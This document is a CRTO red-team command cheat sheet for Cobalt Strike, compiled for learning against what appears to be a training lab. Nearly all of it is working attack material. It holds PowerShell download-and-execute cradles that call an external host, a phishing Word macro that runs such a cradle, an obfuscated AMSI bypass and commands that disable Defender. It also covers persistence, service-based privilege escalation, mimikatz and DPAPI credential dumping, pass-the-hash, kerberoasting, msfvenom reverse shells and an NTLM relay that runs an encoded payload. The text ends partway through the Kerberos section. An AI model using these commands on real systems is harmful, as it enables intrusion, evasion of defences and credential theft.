# Certified Read Team Operator (CRTO) - Cheatsheet 

 **Name** : **CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)**
 
 **Course Link** : https://training.zeropointsecurity.co.uk/courses/red-team-ops

 **Compiled By** : **Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )**

 **Version: 1.0**
 
 **Last Updated** : 13 Feb 2023

 **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.  

### MISC

```powershell
# Run a python3 webserver
$ python3 -m http.server

# Check outbound access to TeamServer
$ iwr -Uri http://nickelviper.com/a

# Change incoming firewall rules
beacon> powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"

## Encode the powershell payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

```


### Command & Control

- Setting up DNS records for DNS based beacon payloads

```powershell
# Set below DNS Type A & NS records, where IP points to TeamServer

@    | A  | 10.10.5.50
ns1  | A  | 10.10.5.50
pics | NS | ns1.nickelviper.com

# Verify the DNS configuration from TeamServer, it should return 0.0.0.0
$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short

# Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration

```

- Start the team server and run as service

```powershell
> sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

```powershell
$ sudo vim /etc/systemd/system/teamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl start teamserver.service
$ sudo systemctl enable teamserver.service
```

- Enable Hosting of Web Delivery Payloads via agscript client in headless mode

```powershell
$ cat host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}

# Add below command in "/etc/systemd/system/teamserver.service" file

ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'

```

```powershell
# Custom C2 Profile for CRTO
set sample_name "Dumbledore";
set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

post-ex {
        set amsi_disable "true";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
}

http-get {
	set uri "/cat.gif /image /pixel.gif /logo.gif";

	client {
        	# customize client indicatorsi
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";

		parameter "utm" "ISO-8898-1";
		parameter "utc" "en-US";

		metadata{
			base64;
			header "Cookie";
		}
	}

	server {
		# customize soerver indicators
		header "Content-Type" "image/gif";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	



		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

http-post {
	set uri "/submit.aspx /finish.aspx";

	client {

		header "Content-Type" "application/octet-stream";
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";
		
		id{
			parameter "id";
		}

		output{
			print;
		}

	}


	server {
		# customize soerver indicators
		header "Content-Type" "text/plain";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			print;
		}
	}
}

http-stager {

	server {
		header "Content-Type" "application/octet-stream";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	
	}
}

```

### Defender Antivirus

```powershell

# Compile the Artifact kit
$ ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts

# Compile the resource kit
$ ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Verify if the payload is AV Safe
PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI

# Load the CNA file: Cobalt Strike > Script Manager > Load_ and select the CNA
# Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`

# Disable AMSI in Malleable C2 profile
$ vim c2-profiles/normal/webbug.profile

#Right above the `http-get` block, add the following:
post-ex {
        set amsi_disable "true";
}

# Verify the modified C2 profile
attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile

# Creating custom C2 profiles
https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

# Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.

# Behaviour Detections (change default process for fork & run)
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Change the default process for psexec
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Disable Defender from local powershell session
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true

# AMSI bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


```




### Initial Compromise

-  Enumerating OWA to identify valid user and conducting password spraying attack

```powershell
# Identify the mail server of given domain
$ dig cyberbotic.io
$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain
ps> ipmo C:\Tools\MailSniper\MailSniper.ps1
ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List
$ ~/namemash.py names.txt > possible.txt

# Validate the username to find active/real usernames
ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users
ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List
ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

- Create a malicious Office file having embedded macro

```vbscript
# Step 1: Open a blank word document "Document1". Navigate to  View > Macros > Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub


# Step 2: Generate a payload for web delivery (Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes


Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
	Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub

# Step 3: Save the document as .doc file and send it as phising email

```


### Host Reconnaissance

```powershell
# Identify running process like AV, EDR or any monitoring and logging solution
beacon> ps

# Use Seatbealt to enumerate about system
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user
beacon> screenshot
beacon> clipboard
beacon> net logons

beacon> keylogger
beacon> job
beacon> jobkill 3
```


### Host Persistence (Normal + Privilleged)

```powershell

# Default location for powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

# Common userland persistence methods include HKCU / HKLM Registry Autoruns, Scheduled Tasks, Startup Folder

# Persistance - Task Scheduler
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA" -n "Updater" -m add -o hourly

# Persistance - Startup Folder
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA" -f "UserEnvSetup" -m add

# Persistance - Registry Autorun
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

# Persistance COM Hijacks

# Persistance - Privilleged System User

# Windows Service
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

# Register WMI event to trigger our payload
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe

```


### Privilege Escalation

```powershell
# Query and Manage all the installed services
beacon> powershell Get-Service | fl
beacon> run wmic service get name, pathname
beacon> run sc query
beacon> run sc qc VulnService2
beacon> run sc stop VulnService1
beacon> run sc start VulnService1

# Use SharpUp to find exploitable services
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 

# CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
beacon> cd C:\Program Files\Vulnerable Services
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> run sc stop VulnService1
beacon> run sc start VulnService1
beacon> connect localhost 4444

# CASE 2: Weak Service Permission (Possible to modify service configuration)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
beacon> run sc qc VulnService2
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
beacon> run sc qc VulnService2
beacon> run sc stop VulnService2
beacon> run sc start VulnService2
beacon> connect localhost 4444

# CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
beacon> run sc stop VulnService3
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload C:\Payloads\Service 3.exe
beacon> run sc start VulnService3
beacon> connect localhost 4444

# UAC Bypass
beacon> run whoami /groups
beacon> elevate uac-schtasks tcp-local
beacon> run netstat -anop tcp
beacon> connect localhost 4444
```


### Credential Theft

```powershell
# "!" symbol is used to run command in elevated context of System User
# "@" symbol is used to impersonate beacon thread token

# Dump the local SAM database 
beacon> mimikatz !lsadump::sam

# Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users
beacon> mimikatz !sekurlsa::logonpasswords

# Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)
beacon> mimikatz !sekurlsa::ekeys

# Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)
beacon> mimikatz !lsadump::cache

# List the kerberos tickets cached in current logon session or all logon session (privileged session)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump the TGT Ticket from given Logon Session (LUID)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt

# DC Sync
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# Dump krbtgt hash from DC (locally)
beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
```


### Domain Recon

- Domain Recon using Power View

```powershell
# Use PowerView for domain enumeration
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

# Get Domain Information
beacon> powerpick Get-Domain -Domain <>

# Get Domain SID
beacon> powerpick Get-DomainSID

# Get Domain Controller
beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl

# Get Forest Information
beacon> powerpick Get-ForestDomain -Forest <>

# Get Domain Policy 
beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess

# Get Domain users
beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation
beacon> powerpick Get-DomainUser | select cn,serviceprincipalname
beacon> powerpick Get-DomainUser -PreauthNotRequired
beacon> powerpick Get-DomainUser -TrustedToAuth

# Get Domain Computer
beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Idenitify Computer Accounts where unconstrained and constrained delefation is enabled
beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

# Get Domain OU
beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name

# Identify computers in given OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get Domain group (Use -Recurse Flag)
beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Get Domain Group Member
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

# Get Domain GPO
beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Find the System where given GPO are applicable
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

# Idenitfy domain users/group who have local admin via Restricted group or GPO 
beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

# Enumerates the machines where a specific domain user/group has local admin rights
beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Get Domain Trusts
beacon> powerpick Get-DomainTrust

# Find Local Admin Access on other domain computers based on context of current user
beacon> powerpick Find-LocalAdminAccess
beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>

beacon> powerpick Invoke-UserHunter
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>

``` 

- Domain recon using SharpView binary

```powershell
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

- Domain recon using ADSearch

```powershell

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins*))"

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# Kerberostable Users
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# ASEPROAST
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Unconstrained Delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Constrained Delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Additionally, the `--json` parameter can be used to format the output in JSON
```

### User Impersonation

- Pass The Hash Attack

```powershell
beacon> getuid
beacon> ls \\web.dev.cyberbotic.io\c$

# PTH using inbuild method in CS (internally uses Mimikatz)
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

# Find Local Admin Access
beacon> powerpick Find-LocalAdminAccess

beacon> rev2self
```

- Pass The Ticket Attack

```powershell
# Create a sacrificial token with dummy credentials
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Inject the TGT ticket into logon session returned as output of previous command
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

# OR Combine above 2 steps in one
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 

beacon> steal_token 4748
```

- OverPass The Hash

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

- Token Impersonation & Proces Injection

```powershell
beacon> steal_token 4464
beacon> inject 4464 x64 tcp-local
beacon> shinject /path/to/binary
```

### Lateral Movement

```powershell
# using Jump
beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# Using remote exec
beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>

# Example Windows Management Instrumentation (WMI)
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

# Executing .Net binary remotely 
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# Invoke DCOM (better opsec)
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
beacon> link web.dev.cyberbotic.io agent_vinod

NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution 
```

### Session Passing

```powershell
# CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)
beacon> spawn x64 http

# CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)

# Setup Metasploit listener
attacker@ubuntu ~> sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

# Setup a Foreign Listener in cobalt strike with above IP & port details

# Use Jump psexec to execute the beacon payload and pass the session
beacon> jump psexec Foreign_listener

# CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)

# Setup up metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) > exploit

# Generate binary
ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# Inject msf shellcode into process memory
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin

```

### Pivoting

```powershell
# Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# Verify the SOCKS proxy on team server
attacker@ubuntu ~> sudo ss -lpnt

# Configure Proxychains in Linux
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

$attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30

# Use Proxifier for Windows environment 
ps> runas /netonly /user:dev/bfarmer mmc.exe
ps> mimikatz # privilege::debug
ps> mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

# Use FoxyProxy plugin to access Webportal via SOCKS Proxy

# Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)
beacon> rportfwd 8080 127.0.0.1 80
beacon> run netstat -anp tcp
ps> iwr -Uri http://wkstn-2:8080/a

beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"

# NTLM Relay

1. Setup SOCKS Proxy on the beacon
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

3. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution
$ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

# iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

4. Setup reverse port forwarding 
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its .cna file
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

6. Manually try to access share on our system or use MSPRN, Printspooler to force authentication

7. Verify the access in weblog and use link command to connect with SMB beacon
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

```

### Data Protection API

```powershell
# Use mimikatz to dump secrets from windows vault
beacon> mimikatz !vault::list
beacon> mimikatz !vault::cred /patch

# Part 1: Enumerate stored credentials

0. Check if system has credentials stored in either web or windows vault
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# Part 2.1: Scheduled Task Credentials

1. Credentials for task scheduler are stored at below location in encrypted blob
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

2. Find the GUID of Master key associated with encrypted blob (F31...B6E)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

3. Dump all the master keys and filter the one we need based on GUID identified in previous step
beacon> mimikatz !sekurlsa::dpapi

4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

# Part 2.2: Extracting stored RDP Password 

1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

2. Verify the credential blob in users cred directory (Note enc blob ID)
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

3. Master key is stored in users Protect directory (Note GUID of master key matching with Seatbelt)
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

4. Decrypt the master key (Need to be execute in context of user who owns the key, use @ modifier)
beacon> mimikatz !sekurlsa::dpapi
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

5. Use Master key to decrypt the credentials blob
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

```

### Kerberos

```powershell

# Kerberosting
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

ps> hashcat -a 0 -m 13100 hashes wordlist

# ASREPRoast
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

ps> hashcat -a 0 -m 18200 svc_oracle wordlist

# Unconstrained Delegation (Caches TGT of any user accessing its service)

1. Identify the computer objects having Unconstrained Delegation enabled
